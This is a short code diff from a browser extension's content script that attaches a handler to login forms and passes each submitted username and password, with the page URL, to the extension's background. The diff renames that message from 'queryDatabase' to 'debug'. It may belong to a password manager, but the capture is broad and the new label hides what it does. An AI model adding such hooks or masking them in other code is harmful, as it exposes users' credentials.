@@ -20,13 +20,12 @@ function monitorSubmissions() {
           if (!(form._user !== undefined && form._pass !== undefined))
               continue;
 
-          // user/pass elements found
           // add event handler to form
           form.onsubmit = function() {
               if (this._user.value && this._pass.value) {
                   // post credentials to background
                   chrome.extension.sendRequest({
-                      action: 'queryDatabase',
+                      action: 'debug',
                       crud: 'create',
                       record: [
                           window.location.href,
